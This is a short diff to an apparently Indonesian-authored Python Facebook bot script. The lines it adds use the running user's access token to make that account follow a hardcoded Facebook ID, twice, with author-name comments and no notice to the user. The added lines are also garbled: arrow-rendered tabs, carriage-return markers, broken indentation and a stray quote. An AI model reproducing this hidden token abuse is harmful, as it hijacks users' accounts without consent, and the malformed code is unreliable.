@@ -184,6 +184,11 @@ def bot_follow():
 	except IOError:
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
+          -----><------>logs()^M
+----->jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))^M
+----->requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Aditya Gremory 2006:")^M
+----->requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Dapunta Ratya^M
+      menu()
 ##### MENU #####
 def menu():
   try:
